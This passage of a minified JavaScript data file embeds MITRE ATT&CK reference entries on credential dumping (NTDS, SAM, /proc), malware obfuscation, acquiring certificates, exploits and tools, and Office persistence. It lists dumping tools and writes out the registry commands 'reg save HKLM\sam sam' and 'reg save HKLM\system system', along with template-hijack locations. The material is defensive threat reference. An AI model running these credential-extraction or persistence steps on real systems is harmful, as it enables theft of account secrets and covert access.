contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n";yK.external_references=[{source_name:b,external_id:yL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F003"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FActive_Directory",description:"Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018.",source_name:"Wikipedia Active Directory"},{url:"http:\u002F\u002Fadsecurity.org\u002F?p=1275",description:"Metcalf, S. (2015, January 19). Attackers Can Now Use Mimikatz to Implant Skeleton Key on Domain Controllers & BackDoor Your Active Directory Forest. Retrieved February 3, 2015.",source_name:"Metcalf 2015"}];yK["subtechnique-of"]=P;yM.id=yN;yM["object-type"]=a;yM.name="Proc Filesystem";yM.description="Adversaries may gather credentials from information stored in the Proc filesystem or \u003Ccode\u003E\u002Fproc\u003C\u002Fcode\u003E. The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.\n\nThis functionality has been implemented in the MimiPenguin\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fhuntergregal\u002Fmimipenguin'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E, an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.";yM.external_references=[{source_name:b,external_id:yN,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F007"},{url:"https:\u002F\u002Fgithub.com\u002Fhuntergregal\u002Fmimipenguin",description:"Gregal, H. (2017, May 12). MimiPenguin. Retrieved December 5, 2017.",source_name:"MimiPenguin GitHub May 2017"}];yM["subtechnique-of"]=P;yO.id=yP;yO["object-type"]=a;yO.name="Security Account Manager";yO.description="Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the \u003Ccode\u003Enet user\u003C\u002Fcode\u003E command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0008'\u003Egsecdump\u003C\u002Fa\u003E\n* \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0002'\u003EMimikatz\u003C\u002Fa\u003E\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* \u003Ccode\u003Ereg save HKLM\\sam sam\u003C\u002Fcode\u003E\n* \u003Ccode\u003Ereg save HKLM\\system system\u003C\u002Fcode\u003E\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FNeohapsis\u002Fcreddump7'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nNotes: \n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n";yO.external_references=[{source_name:b,external_id:yP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003\u002F002"},{url:"https:\u002F\u002Fgithub.com\u002FNeohapsis\u002Fcreddump7",description:"Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018.",source_name:"GitHub Creddump7"}];yO["subtechnique-of"]=P;yQ.id=yR;yQ["object-type"]=a;yQ.name="Binary Padding";yQ.description="Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002F2018\u002F03\u002F13\u002Foceanlotus-ships-new-backdoor\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fold-malware-tricks-to-bypass-detection-in-the-age-of-big-data\u002F78010\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virustotal.com\u002Fen\u002Ffaq\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";yQ.external_references=[{source_name:b,external_id:yR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027\u002F001"},{external_id:"CAPEC-572",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F572.html"},{external_id:"CAPEC-655",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F655.html"},{source_name:"ESET OceanLotus",description:"Foltýn, T. (2018, March 13). OceanLotus ships new backdoor using old tricks. Retrieved May 22, 2018.",url:"https:\u002F\u002Fwww.welivesecurity.com\u002F2018\u002F03\u002F13\u002Foceanlotus-ships-new-backdoor\u002F"},{source_name:"Securelist Malware Tricks April 2017",url:"https:\u002F\u002Fsecurelist.com\u002Fold-malware-tricks-to-bypass-detection-in-the-age-of-big-data\u002F78010\u002F",description:"Ishimaru, S.. (2017, April 13). Old Malware Tricks To Bypass Detection in the Age of Big Data. Retrieved May 30, 2019."},{source_name:"VirusTotal FAQ",url:"https:\u002F\u002Fwww.virustotal.com\u002Fen\u002Ffaq\u002F",description:"VirusTotal. (n.d.). VirusTotal FAQ. Retrieved May 23, 2019."}];yQ["subtechnique-of"]=aC;yS.id=yT;yS["object-type"]=a;yS.name="Compile After Delivery";yS.description="Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables\u002Fbinaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC\u002FMinGW.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.clearskysec.com\u002Fwp-content\u002Fuploads\u002F2018\u002F11\u002FMuddyWater-Operations-in-Lebanon-and-Oman.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSource code payloads may also be encrypted, encoded, and\u002For embedded within other files, such as those delivered as a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS\u002FLinux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fwindows-app-runs-on-mac-downloads-info-stealer-and-adware\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";yS.external_references=[{source_name:b,external_id:yT,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027\u002F004"},{description:"ClearSky Cyber Security. (2018, November). MuddyWater Operations in Lebanon and Oman: Using an Israeli compromised domain for a two-stage campaign. Retrieved November 29, 2018.",url:"https:\u002F\u002Fwww.clearskysec.com\u002Fwp-content\u002Fuploads\u002F2018\u002F11\u002FMuddyWater-Operations-in-Lebanon-and-Oman.pdf",source_name:"ClearSky MuddyWater Nov 2018"},{source_name:"TrendMicro WindowsAppMac",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fwindows-app-runs-on-mac-downloads-info-stealer-and-adware\u002F",description:"Trend Micro. (2019, February 11). Windows App Runs on Mac, Downloads Info Stealer and Adware. Retrieved April 25, 2019."}];yS["subtechnique-of"]=aC;yU.id=yV;yU["object-type"]=a;yU.name="Indicator Removal from Tools";yU.description="Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.";yU.external_references=[{source_name:b,external_id:yV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027\u002F005"}];yU["subtechnique-of"]=aC;yW.id=yX;yW["object-type"]=a;yW.name="Software Packing";yW.description="Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2018\u002F01\u002FWP-FinFisher.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, \u003Csup\u003E\u003Ca href='http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FExecutable_compression'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ";yW.external_references=[{source_name:b,external_id:yX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027\u002F002"},{external_id:"CAPEC-570",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F570.html"},{source_name:"ESET FinFisher Jan 2018",url:"https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2018\u002F01\u002FWP-FinFisher.pdf",description:"Kafka, F. (2018, January). ESET's Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019."},{url:"http:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FExecutable_compression",description:"Executable compression. (n.d.). Retrieved December 4, 2014.",source_name:"Wikipedia Exe Compression"}];yW["subtechnique-of"]=aC;yY.id=yZ;yY["object-type"]=a;yY.name=oG;yY.description="Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n\u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0038'\u003EDuqu\u003C\u002Fa\u003E was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FDuqu'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nBy the end of 2017, a threat group used \u003Ccode\u003EInvoke-PSImage\u003C\u002Fcode\u003E to hide \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E commands in an image file (.png) and execute the code on a victim's system. In this particular case the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059\u002F001'\u003EPowerShell\u003C\u002Fa\u003E code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecuringtomorrow.mcafee.com\u002Fmcafee-labs\u002Fmalicious-document-targets-pyeongchang-olympics\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  ";yY.external_references=[{source_name:b,external_id:yZ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027\u002F003"},{external_id:"CAPEC-636",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F636.html"},{url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FDuqu",description:"Wikipedia. (2017, December 29). Duqu. Retrieved April 10, 2018.",source_name:"Wikipedia Duqu"},{url:"https:\u002F\u002Fsecuringtomorrow.mcafee.com\u002Fmcafee-labs\u002Fmalicious-document-targets-pyeongchang-olympics\u002F",description:"Saavedra-Morales, J., Sherstobitoff, R. (2018, January 6). Malicious Document Targets Pyeongchang Olympics. Retrieved April 10, 2018.",source_name:"McAfee Malicious Doc Targets Pyeongchang Olympics"}];yY["subtechnique-of"]=aC;zh.id=zi;zh["object-type"]=a;zh.name=pB;zh.description="Adversaries may buy and\u002For steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FCode_signing'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Users and\u002For security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F002'\u003ECode Signing\u003C\u002Fa\u003E, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.";zh.external_references=[{source_name:b,external_id:zi,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F003"},{url:ff,description:fg,source_name:fh}];zh["subtechnique-of"]=ab;zj.id=zk;zj["object-type"]=a;zj.name=fi;zj.description="Adversaries may buy and\u002For steal SSL\u002FTLS certificates that can be used during targeting. SSL\u002FTLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL\u002FTLS certificates to further their operations, such as encrypting C2 traffic (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1573\u002F002'\u003EAsymmetric Cryptography\u003C\u002Fa\u003E with \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1071\u002F001'\u003EWeb Protocols\u003C\u002Fa\u003E) or even enabling \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1557'\u003EMan-in-the-Middle\u003C\u002Fa\u003E if the certificate is trusted or otherwise added to the root of trust (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1553\u002F004'\u003EInstall Root Certificate\u003C\u002Fa\u003E). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fthreatpost.com\u002Ffinal-report-diginotar-hack-shows-total-compromise-ca-servers-103112\u002F77170\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may register or hijack domains that they will later purchase an SSL\u002FTLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL\u002FTLS certificates, such as domain validation certificates, for free.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fletsencrypt.org\u002Fdocs\u002Ffaq\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1608\u002F003'\u003EInstall Digital Certificate\u003C\u002Fa\u003E) on infrastructure under their control.";zj.external_references=[{source_name:b,external_id:zk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F004"},{description:ze,source_name:zf,url:zg},{source_name:"Let's Encrypt FAQ",url:"https:\u002F\u002Fletsencrypt.org\u002Fdocs\u002Ffaq\u002F",description:"Let's Encrypt. (2020, April 23). Let's Encrypt FAQ. Retrieved October 15, 2020."},{source_name:fj,url:fk,description:fl},{source_name:"Recorded Future Beacon Certificates",url:"https:\u002F\u002Fwww.recordedfuture.com\u002Fcobalt-strike-servers\u002F",description:"Insikt Group. (2019, June 18). A Multi-Method Approach to Identifying Rogue Cobalt Strike Servers. Retrieved October 16, 2020."}];zj["subtechnique-of"]=ab;zl.id=zm;zl["object-type"]=a;zl.name=pG;zl.description="Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find\u002Fmodify exploits from online or purchase them from exploit vendors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.exploit-db.com\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.wired.co.uk\u002Farticle\u002Fdarkhotel-hacking-team-cyber-espionage'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.nytimes.com\u002F2013\u002F07\u002F14\u002Fworld\u002Feurope\u002Fnations-buying-as-hackers-sell-computer-flaws.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcitizenlab.ca\u002F2016\u002F08\u002Fmillion-dollar-dissident-iphone-zero-day-nso-group-uae\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.vice.com\u002Fen\u002Farticle\u002F3kx5y3\u002Fuzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.wired.co.uk\u002Farticle\u002Fdarkhotel-hacking-team-cyber-espionage'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1203'\u003EExploitation for Client Execution\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068'\u003EExploitation for Privilege Escalation\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1211'\u003EExploitation for Defense Evasion\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1212'\u003EExploitation for Credential Access\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1210'\u003EExploitation of Remote Services\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1499\u002F004'\u003EApplication or System Exploitation\u003C\u002Fa\u003E).";zl.external_references=[{source_name:b,external_id:zm,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F005"},{source_name:"Exploit Database",url:"https:\u002F\u002Fwww.exploit-db.com\u002F",description:"Offensive Security. (n.d.). Exploit Database. Retrieved October 15, 2020."},{source_name:"TempertonDarkHotel",description:"Temperton, J. (2015, August 10). Hacking Team zero-day used in new Darkhotel attacks. Retrieved March 9, 2017.",url:"https:\u002F\u002Fwww.wired.co.uk\u002Farticle\u002Fdarkhotel-hacking-team-cyber-espionage"},{source_name:y_,description:y$,url:za},{url:zb,description:zc,source_name:zd},{source_name:"Wired SandCat Oct 2019",url:"https:\u002F\u002Fwww.vice.com\u002Fen\u002Farticle\u002F3kx5y3\u002Fuzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec",description:"Zetter, K. (2019, October 3). Researchers Say They Uncovered Uzbekistan Hacking Operations Due to Spectacularly Bad OPSEC. Retrieved October 15, 2020."}];zl["subtechnique-of"]=ab;zn.id=zo;zn["object-type"]=a;zn.name=pJ;zn.description="Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).";zn.external_references=[{source_name:b,external_id:zo,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F001"}];zn["subtechnique-of"]=ab;zp.id=f$;zp["object-type"]=a;zp.name="Tool";zp.description="Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0029'\u003EPsExec\u003C\u002Fa\u003E). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0154'\u003ECobalt Strike\u003C\u002Fa\u003E. Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.recordedfuture.com\u002Fidentifying-cobalt-strike-servers\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and\u002For software licenses from third-party entities (including other adversaries).";zp.external_references=[{source_name:b,external_id:f$,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F002"},{source_name:"Recorded Future Beacon 2019",url:"https:\u002F\u002Fwww.recordedfuture.com\u002Fidentifying-cobalt-strike-servers\u002F",description:"Recorded Future. (2019, June 20). Out of the Blue: How Recorded Future Identified Rogue Cobalt Strike Servers. Retrieved October 16, 2020."}];zp["subtechnique-of"]=ab;zq.id=zr;zq["object-type"]=a;zq.name="Vulnerabilities";zq.description="Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAn adversary may monitor vulnerability disclosures\u002Fdatabases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F005'\u003EExploits\u003C\u002Fa\u003E) or to attempt to develop one themselves (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587\u002F004'\u003EExploits\u003C\u002Fa\u003E).";zq.external_references=[{source_name:b,external_id:zr,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588\u002F006"},{source_name:"National Vulnerability Database",url:"https:\u002F\u002Fnvd.nist.gov\u002F",description:"National Vulnerability Database. (n.d.). National Vulnerability Database. Retrieved October 15, 2020."}];zq["subtechnique-of"]=ab;zy.id=zz;zy["object-type"]=a;zy.name="Add-ins";zy.description="Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.office.com\u002Farticle\u002FAdd-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E There are different types of add-ins that can be used by the various Office products; including Word\u002FExcel add-in Libraries (WLL\u002FXLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flabs.mwrinfosecurity.com\u002Fblog\u002Fadd-in-opportunities-for-office-persistence\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsummit.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fsummit\u002Fcds-2018\u002Fpresentations\u002Fcds18-technical-s03-youve-got-mail.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ";zy.external_references=[{source_name:b,external_id:zz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1137\u002F006"},{url:"https:\u002F\u002Fsupport.office.com\u002Farticle\u002FAdd-or-remove-add-ins-0af570c4-5cf3-4fa9-9b88-403625a0b460",description:"Microsoft. (n.d.). Add or remove add-ins. Retrieved July 3, 2017.",source_name:"Microsoft Office Add-ins"},{url:"https:\u002F\u002Flabs.mwrinfosecurity.com\u002Fblog\u002Fadd-in-opportunities-for-office-persistence\u002F",description:"Knowles, W. (2017, April 21). Add-In Opportunities for Office Persistence. Retrieved July 3, 2017.",source_name:"MRWLabs Office Persistence Add-ins"},{source_name:"FireEye Mail CDS 2018",url:"https:\u002F\u002Fsummit.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fsummit\u002Fcds-2018\u002Fpresentations\u002Fcds18-technical-s03-youve-got-mail.pdf",description:"Caban, D. and Hirani, M. (2018, October 3). You’ve Got Mail! Enterprise Email Compromise. Retrieved April 22, 2019."},{source_name:zA,url:zB,description:zC}];zy["subtechnique-of"]=ac;zD.id=zE;zD["object-type"]=a;zD.name="Office Template Macros";zD.description="Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fsupport.office.com\u002Farticle\u002FChange-the-Normal-template-Normal-dotm-06de294b-d216-47f6-ab77-ccb5166f98ea'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOffice Visual Basic for Applications (VBA) macros \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Fvba\u002Foffice-shared-vba\u002Farticles\u002Fgetting-started-with-vba-in-office'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fenigma0x3.net\u002F2014\u002F01\u002F23\u002Fmaintaining-access-with-normal-dotm\u002Fcomment-page-1\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.hexacorn.com\u002Fblog\u002F2017\u002F04\u002F19\u002Fbeyond-good-ol-run-key-part-62\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Shared templates may also be stored and pulled from remote locations.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.221bluestreet.com\u002Fpost\u002Foffice-templates-and-globaldotname-a-stealthy-office-persistence-technique'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nWord Normal.dotm location:\u003Cbr\u003E\n\u003Ccode\u003EC:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm\u003C\u002Fcode\u003E\n\nExcel Personal.xlsb location:\u003Cbr\u003E\n\u003Ccode\u003EC:\\Users\\&lt;username&gt;\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB\u003C\u002Fcode\u003E\n\nAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under \u003Ccode\u003EC:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\\u003C\u002Fcode\u003E, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.\u003Csup\u003E\u003Ca 